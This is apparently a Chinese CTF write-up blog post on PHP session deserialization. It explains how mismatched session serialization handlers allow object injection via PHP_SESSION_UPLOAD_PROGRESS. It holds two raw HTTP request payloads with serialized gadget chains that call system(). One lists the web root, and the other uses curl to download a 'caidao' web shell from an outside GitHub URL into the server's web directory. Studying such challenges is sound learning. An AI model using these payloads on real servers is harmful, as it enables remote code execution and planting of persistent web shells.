+++
title = "关于PHP SESSION反序列化"
topics = ["Pentest"]
tags = ["php"]
description = "基于第三届4.29“安恒杯”网络安全技术大赛初赛中的题，第三个web题，php反序列化漏洞"
date = "2018-07-23T00:09:17+08:00"
draft = false
+++

### 0x00 环境
PHP：PHP Version 5.5.35  
System： Linux version 2.6.32-504.23.4.el6.x86_64 (Red Hat 4.4.7-11)  
Apache：Apache/2.2.15

公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。 

其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题

我比较菜，这里根据网上已有writeup做一下，记录一下

### 0x00 PHP Session 序列化及反序列化处理器

php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如```__destruct(),__wakeup()```等

PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：
```
---------------------------------------------------------------------------------------------
处理器                      |对应的存储格式
---------------------------------------------------------------------------------------------
php                        |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary                 |键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize (php>=5.5.4) |经过 serialize() 函数反序列处理的数组
---------------------------------------------------------------------------------------------
```

如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码

### 0x01 环境设置







```
POST /phpinfo.php HTTP/1.1
Host: 10.11.11.11
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------162809728719447253529785011
Content-Length: 496

-----------------------------162809728719447253529785011
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

ddd|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:27:"system('ls /var/www/html');";}}}
-----------------------------162809728719447253529785011
Content-Disposition: form-data; name="file"; filename='1.txt'
Content-Type: text/plain

aaaaaa
-----------------------------162809728719447253529785011--
```



```
POST /index.php HTTP/1.1
Host: 192.168.3.136
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=sgff21msc3q4bvoh8dj8dni7o1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------162809728719447253529785011
Content-Length: 575

-----------------------------162809728719447253529785011
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

ddd|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:105:"system('curl -o /var/www/html/reber.php https://raw.githubusercontent.com/reber0/tmp/master/caidao.php');";}}}
-----------------------------162809728719447253529785011
Content-Disposition: form-data; name="file"; filename='1.php'
Content-Type: application/octet-stream

<dddd>
-----------------------------162809728719447253529785011--
```


<br>
#### Reference(侵删)：
* [PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](http://drops.wooyun.org/tips/3909)
* [安恒429|web 3 session反序列化](https://www.tuicool.com/articles/BfuayyI)
* [有趣的php反序列化总结](http://www.mottoin.com/18436.html)


